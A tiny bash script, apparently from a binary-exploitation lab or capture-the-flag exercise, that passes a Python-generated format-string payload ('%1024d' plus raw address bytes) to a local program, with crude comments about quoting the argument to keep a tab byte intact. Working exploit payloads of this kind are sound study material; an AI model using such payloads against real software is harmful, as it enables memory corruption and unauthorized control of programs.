#!/bin/bash

./run_me "$(python -c "import sys; sys.stdout.buffer.write(b'%1024d' + b'\x09\x62\x55\x56')")"

# doesn't work since x09 be recognize as tab cause more than 1 argument.
# Mother fucker

# Add quote surround the python script, make it as a whole arguments!!